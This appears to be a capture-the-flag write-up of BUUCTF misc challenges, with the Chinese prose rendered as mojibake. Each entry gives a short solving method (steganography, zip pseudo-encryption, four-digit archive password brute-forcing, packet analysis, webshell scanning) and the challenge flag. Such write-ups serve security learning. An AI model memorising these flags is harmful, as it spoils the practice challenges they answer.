<h1 id="Nç§æ–¹æ³•è§£å†³"><a href="#Nç§æ–¹æ³•è§£å†³" class="headerlink" title="Nç§æ–¹æ³•è§£å†³"></a>Nç§æ–¹æ³•è§£å†³</h1><p>è§£å‹å¾—åˆ°ä¸€ä¸ª<code>KEY.exe</code>ï¼Œä»¥æ–‡æœ¬å½¢å¼æŸ¥çœ‹ï¼Œå¯ä»¥çœ‹åˆ°å®é™…ä¸Šæ˜¯ä¸€ä¸ªbase64åçš„å›¾ç‰‡<br>è§£ç åå¾—åˆ°ä¸€å¼ äºŒç»´ç ï¼Œæ‰«ç å¾—åˆ°</p>
<blockquote>
<p>flag{dca57f966e4e4e31fd5b15417da63269}</p>
</blockquote>
<h1 id="å¤§ç™½"><a href="#å¤§ç™½" class="headerlink" title="å¤§ç™½"></a>å¤§ç™½</h1><p>å›¾ç‰‡æ”¾å…¥<code>010 editor</code>ä¼šæŠ¥<code>IHDRå—CRC</code>é”™è¯¯ï¼Œå¤§æ¦‚ç‡æ˜¯é«˜å®½è¢«ä¿®æ”¹äº†</p>
<p>ä¿®æ”¹æˆè¾ƒå¤§çš„å€¼<br><img src="/img/buuctf/buu-misc-page1-2.png"></p>
<blockquote>
<p>flag{He1l0_d4_ba1}</p>
</blockquote>
<h1 id="åŸºç¡€ç ´è§£"><a href="#åŸºç¡€ç ´è§£" class="headerlink" title="åŸºç¡€ç ´è§£"></a>åŸºç¡€ç ´è§£</h1><p>æ ¹æ®æç¤ºè¿›è¡Œå››ä½æ•°å­—æš´åŠ›ç ´è§£ï¼Œå¾—åˆ°å¯†ç <code>2563</code><br>è§£å‹åå¯¹å†…å®¹base64è§£ç </p>
<blockquote>
<p>flag{70354300a5100ba78068805661b93a5c}</p>
</blockquote>
<h1 id="ä¹Œé•‡å³°ä¼šç§å›¾"><a href="#ä¹Œé•‡å³°ä¼šç§å›¾" class="headerlink" title="ä¹Œé•‡å³°ä¼šç§å›¾"></a>ä¹Œé•‡å³°ä¼šç§å›¾</h1><p>æ–‡ä»¶å°¾</p>
<blockquote>
<p>flag{97314e7864a8f62627b26f3f998c37f1}</p>
</blockquote>
<h1 id="æ–‡ä»¶ä¸­çš„ç§˜å¯†"><a href="#æ–‡ä»¶ä¸­çš„ç§˜å¯†" class="headerlink" title="æ–‡ä»¶ä¸­çš„ç§˜å¯†"></a>æ–‡ä»¶ä¸­çš„ç§˜å¯†</h1><p>å³é”®æŸ¥çœ‹å±æ€§ï¼Œflagåœ¨å¤‡æ³¨ä¸­</p>
<blockquote>
<p>flag{870c5a72806115cb5439345d8b014396}</p>
</blockquote>
<h1 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h1><p>æµé‡åˆ†æé¢˜<br>æ ¹æ®æç¤ºæ‰¾åˆ°ç®¡ç†å‘˜çš„å¯†ç </p>
<p>ä½¿ç”¨<code>wireshark</code>æ‰“å¼€ï¼Œå› ä¸ºæ˜¯ç™»é™†ç½‘ç«™çš„ä¸€æ®µæµé‡åŒ…ï¼Œæ‰€ä»¥åœ¨è¿‡æ»¤å™¨ä¸­æœç´¢httpï¼Œç„¶åæ‰¾åˆ°ç™»å½•çš„<code>user.php</code>ï¼Œæ‰¾åˆ°å¯†ç <br><img src="/img/buuctf/buu-misc-page1-3.png"></p>
<blockquote>
<p>flag{ffb7567a1d4f4abdffdb54e022f8facd}</p>
</blockquote>
<h1 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h1><p>é¢˜ç›®åä¸º<code>LSB</code>ï¼Œåº”ä¸ºLSBéšå†™</p>
<p>ç”¨<code>stegsolve</code>æ‰“å¼€ï¼Œåœ¨<code>redï¼ŒGreenï¼ŒBlue</code>çš„<code>0</code>é€šé“ä¸­å‘å‘ç°ä¸€å¼ pngçš„æ•°æ®<br><img src="/img/buuctf/buu-misc-page1-4.png"></p>
<p>å¯¼å‡ºåæ˜¯ä¸€å¼ äºŒç»´ç ï¼Œæ‰«ç å¾—åˆ°flag</p>
<blockquote>
<p>flag{1sb_i4_s0_Ea4y}</p>
</blockquote>
<h1 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h1><p>åˆæ˜¯4ä½æ•°å­—çˆ†ç ´ï¼Œ<code>8795</code></p>
<blockquote>
<p>flag{1773c5da790bd3caff38e3decd180eb7}</p>
</blockquote>
<h1 id="zipä¼ªåŠ å¯†"><a href="#zipä¼ªåŠ å¯†" class="headerlink" title="zipä¼ªåŠ å¯†"></a>zipä¼ªåŠ å¯†</h1><p>å¦‚é¢˜ï¼Œä¿®æ”¹å‹ç¼©æ–‡ä»¶åŒºçš„åŠ å¯†æ ‡å¿—ä½ï¼Œæ”¹ä¸º<code>00</code><br><img src="/img/buuctf/buu-misc-page1-5.png"></p>
<blockquote>
<p>flag{Adm1N-B2G-kU-SZIP}</p>
</blockquote>
<h1 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h1><p>æ‰«ç å¾—åˆ°flag</p>
<blockquote>
<p>flag{878865ce73370a4ce607d21ca01b5e59}</p>
</blockquote>
<h1 id="è¢«å—…æ¢çš„æµé‡"><a href="#è¢«å—…æ¢çš„æµé‡" class="headerlink" title="è¢«å—…æ¢çš„æµé‡"></a>è¢«å—…æ¢çš„æµé‡</h1><p>è¿½è¸ªTCPæ•°æ®æµï¼Œå‘ç°ä¸Šä¼ äº†ä¸€å¼ <code>flag.jpg</code>ï¼Œåœ¨å›¾ç‰‡æ•°æ®å°¾å‘ç°flag</p>
<blockquote>
<p>flag{da73d88936010da1eeeb36e945ec4b97}</p>
</blockquote>
<h1 id="é•œå­é‡Œé¢çš„ä¸–ç•Œ"><a href="#é•œå­é‡Œé¢çš„ä¸–ç•Œ" class="headerlink" title="é•œå­é‡Œé¢çš„ä¸–ç•Œ"></a>é•œå­é‡Œé¢çš„ä¸–ç•Œ</h1><p><code>stegsolve</code>å‘ç°<code>0</code>é€šé“ä¸­æœ‰å¼‚å¸¸æ•°æ®ï¼Œæå–å‡ºæ¥å‘ç°ä¸€ä¸²å­—ç¬¦ä¸²<code>Hey I think we can write  safely in this  file without any one seeing it. Any way, the secret key is: st3g0_saurus_wr3cks</code></p>
<blockquote>
<p>flag{st3g0_saurus_wr3cks}</p>
</blockquote>
<h1 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h1><p><code>foremost</code>åˆ†ç¦»å‡ºä¸€ä¸ªzipï¼Œæ ¹æ®æç¤ºè¿›è¡Œå››ä½æ•°çˆ†ç ´ï¼Œ<code>8368</code></p>
<blockquote>
<p>flag{b025fc9ca797a67d2103bfbc407a6d5f}</p>
</blockquote>
<h1 id="å°æ˜çš„ä¿é™©ç®±"><a href="#å°æ˜çš„ä¿é™©ç®±" class="headerlink" title="å°æ˜çš„ä¿é™©ç®±"></a>å°æ˜çš„ä¿é™©ç®±</h1><p><code>foremost</code>åˆ†ç¦»å‡ºä¸€ä¸ªrarï¼Œæ ¹æ®æç¤ºè¿›è¡Œå››ä½æ•°çˆ†ç ´ï¼Œ<code>7869</code></p>
<blockquote>
<p>flag{75a3d68bf071ee188c418ea6cf0bb043}</p>
</blockquote>
<h1 id="çˆ±å› æ–¯å¦"><a href="#çˆ±å› æ–¯å¦" class="headerlink" title="çˆ±å› æ–¯å¦"></a>çˆ±å› æ–¯å¦</h1><p><code>foremost</code>åˆ†ç¦»å‡ºä¸€ä¸ªzipï¼Œå¯†ç åœ¨å›¾ç‰‡å±æ€§ä¸­<code>this_is_not_password</code></p>
<blockquote>
<p>flag{dd22a92bf2cceb6c0cd0d6b83ff51606}</p>
</blockquote>
<h1 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h1><p>è¿½è¸ªTCPæµ</p>
<blockquote>
<p>flag{385b87afc8671dee07550290d16a8071}</p>
</blockquote>
<h1 id="éšè—çš„é’¥åŒ™"><a href="#éšè—çš„é’¥åŒ™" class="headerlink" title="éšè—çš„é’¥åŒ™"></a>éšè—çš„é’¥åŒ™</h1><p><code>strings</code>å¾—åˆ°<code>flag:base64:(Mzc3Y2JhZGRhMWVjYTJmMmY3M2QzNjI3Nzc4MWYwMGE=)</code></p>
<blockquote>
<p>flag{377cbadda1eca2f2f73d36277781f00a}</p>
</blockquote>
<h1 id="å¦å¤–ä¸€ä¸ªä¸–ç•Œ"><a href="#å¦å¤–ä¸€ä¸ªä¸–ç•Œ" class="headerlink" title="å¦å¤–ä¸€ä¸ªä¸–ç•Œ"></a>å¦å¤–ä¸€ä¸ªä¸–ç•Œ</h1><p>å°†æ–‡ä»¶å°¾çš„<code>01101011 01101111 01100101 01101011 01101010 00110011 01110011</code>è½¬æˆå­—ç¬¦ä¸²</p>
<blockquote>
<p>flag{koekj3s}</p>
</blockquote>
<h1 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h1><p>ä½¿ç”¨<code>stegsolve</code>åœ¨<code>0</code>é€šé“ä¸­å‘ç°<code>zip</code>æ•°æ®<br>æå–åä¼šå‘ç°æç¤ºæ–‡ä»¶å·²æŸåï¼Œå°†ç»“å°¾å¤„æ²¡ç”¨çš„æ•°æ®åˆ é™¤å°±å¯ä»¥äº†<br>è§£å‹å¾—åˆ°ä¸€ä¸ª<code>ELF</code>æ–‡ä»¶ï¼Œè¿è¡Œå¾—åˆ°flag</p>
<blockquote>
<p>flag{dd0gf4c3tok3yb0ard4g41n~~~}</p>
</blockquote>
<h1 id="å‡å¦‚ç»™æˆ‘ä¸‰å¤©å…‰æ˜"><a href="#å‡å¦‚ç»™æˆ‘ä¸‰å¤©å…‰æ˜" class="headerlink" title="å‡å¦‚ç»™æˆ‘ä¸‰å¤©å…‰æ˜"></a>å‡å¦‚ç»™æˆ‘ä¸‰å¤©å…‰æ˜</h1><p>å›¾ç‰‡ä¸‹æœ‰ç›²æ–‡ï¼Œç™¾åº¦æ‰¾ä¸ªç›²æ–‡è¡¨å¯¹ä¸€ä¸‹ï¼Œå¾—åˆ°<code>kmdonowg</code><br>ä½¿ç”¨<code>audacity</code>åˆ†æéŸ³é¢‘ï¼Œå‘ç°æ‘©æ–¯<code>-.-. - ..-. .-- .--. . .. ----- ---.. --... ...-- ..--- ..--.. ..--- ...-- -.. --..</code></p>
<p>è§£æ‘©æ–¯å¾—åˆ°flag</p>
<blockquote>
<p>flag{wpei08732?23dz}</p>
</blockquote>
<h1 id="ç¥ç§˜é¾™å·é£"><a href="#ç¥ç§˜é¾™å·é£" class="headerlink" title="ç¥ç§˜é¾™å·é£"></a>ç¥ç§˜é¾™å·é£</h1><p>å››ä½æ•°å­—çˆ†ç ´ï¼Œ<code>5463</code><br>å¾—åˆ°ä¸€ä¸²<code>brainfuck</code>å­—ç¬¦ä¸²<br>è§£ç å¾—åˆ°flag</p>
<blockquote>
<p>flag{e4bbef8bdf9743f8bf5b727a9f6332a8}</p>
</blockquote>
<h1 id="åé—¨æŸ¥æ€"><a href="#åé—¨æŸ¥æ€" class="headerlink" title="åé—¨æŸ¥æ€"></a>åé—¨æŸ¥æ€</h1><p>ç”¨æ²³é©¬æŸ¥æ€ï¼ŒDç›¾æˆ–è€…æ‰‹åŠ¨æŸ¥çœ‹<br>æ‰¾åˆ°<code>include\include.php</code></p>
<blockquote>
<p>flag{6ac45fb83b3bc355c024f5034b947dd3}</p>
</blockquote>
<h1 id="æ•°æ®åŒ…ä¸­çš„çº¿ç´¢"><a href="#æ•°æ®åŒ…ä¸­çš„çº¿ç´¢" class="headerlink" title="æ•°æ®åŒ…ä¸­çš„çº¿ç´¢"></a>æ•°æ®åŒ…ä¸­çš„çº¿ç´¢</h1><p>è¿‡æ»¤å™¨ç­›é€‰<code>HTTP</code>åŒ…ï¼Œå‘ç°ä¸€æ®µbase64åŠ å¯†åçš„æ•°æ®ï¼Œè§£å¯†åæ˜¯ä¸€å¼ jpg</p>
<blockquote>
<p>flag{209acebf6324a09671abc31c869de72c}</p>
</blockquote>
<h1 id="è·å…°å®½å¸¦æ•°æ®æ³„éœ²"><a href="#è·å…°å®½å¸¦æ•°æ®æ³„éœ²" class="headerlink" title="è·å…°å®½å¸¦æ•°æ®æ³„éœ²"></a>è·å…°å®½å¸¦æ•°æ®æ³„éœ²</h1><p>è·¯ç”±å™¨é…ç½®æ–‡ä»¶<br>ä½¿ç”¨<code>RouterPassView</code>æ‰“å¼€ï¼Œæœç´¢<code>useranme</code></p>
<blockquote>
<p>flag{053700357621}</p>
</blockquote>
<h1 id="æ¥é¦–æ­Œå§"><a href="#æ¥é¦–æ­Œå§" class="headerlink" title="æ¥é¦–æ­Œå§"></a>æ¥é¦–æ­Œå§</h1><p><code>audacity</code>åˆ†æéŸ³é¢‘ï¼Œå‘ç°å·¦å£°é“æœ‰æ‘©æ–¯</p>
<p><code>..... -... -.-. ----. ..--- ..... -.... ....- ----. -.-. -... ----- .---- ---.. ---.. ..-. ..... ..--- . -.... .---- --... -.. --... ----- ----. ..--- ----. .---- ----. .---- -.-. </code></p>
<blockquote>
<p>flag{5BC925649CB0188F52E617D70929191C}</p>
</blockquote>
<h1 id="webshellåé—¨"><a href="#webshellåé—¨" class="headerlink" title="webshellåé—¨"></a>webshellåé—¨</h1><p><code>Dç›¾</code>æŸ¥æ€ï¼Œå‘ç°<code>member\zp.php</code></p>
<blockquote>
<p>flag{ba8e6c6f35a53933b871480bb9a9545c}</p>
</blockquote>
<h1 id="é¢å…·ä¸‹çš„flag"><a href="#é¢å…·ä¸‹çš„flag" class="headerlink" title="é¢å…·ä¸‹çš„flag"></a>é¢å…·ä¸‹çš„flag</h1><p><code>foremost</code>åˆ†ç¦»å‡ºä¸€ä¸ªzipï¼Œä¼ªåŠ å¯†ï¼Œå°†åŠ å¯†æ ‡å¿—ä½æ”¹ä¸º<code>00</code>ï¼Œå¾—åˆ°ä¸€ä¸ª<code>vmdk</code>æ–‡ä»¶ï¼Œä½†æ˜¯è¿™ä¸ªæ–‡ä»¶å¾ˆå°ï¼Œåªæœ‰<code>3MB</code>ï¼Œæ‰€ä»¥ä¸å¤ªå¯èƒ½éœ€è¦æŒ‚è½½</p>
<p>kailä¸‹ä½¿ç”¨7zè§£å‹<code>7z x flag.vmdk -o/root/flag</code>ï¼Œå¾—åˆ°<code>key_part_one</code>å’Œ<code>key_part_two</code></p>
<p>åˆ†åˆ«è¿›è¡Œ<code>brainfuck</code>å’Œ<code>ook</code>è§£ç </p>
<blockquote>
<p>flag{N7F5_AD5_i5_funny!}</p>
</blockquote>
<h1 id="ä¹è¿ç¯"><a href="#ä¹è¿ç¯" class="headerlink" title="ä¹è¿ç¯"></a>ä¹è¿ç¯</h1><p><code>foremost</code>åˆ†ç¦»å‡ºä¸€ä¸ªzipï¼Œä¼ªåŠ å¯†ï¼Œå°†åŠ å¯†æ ‡å¿—ä½æ”¹ä¸º<code>00</code>ï¼Œå¾—åˆ°ä¸€å¼ jpgï¼Œä½¿ç”¨<code>steghide</code>ç©ºå¯†ç è§£å¯†ï¼Œå¾—åˆ°å¯†ç <code>bV1g6t5wZDJif^J7</code>ï¼Œè§£å‹å‹ç¼©åŒ…å¾—åˆ°flag</p>
<blockquote>
<p>flag{1RTo8w@&amp;4nK@z*XL}</p>
</blockquote>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>buuctf</tag>
      </tags>
  </entry>
</search>
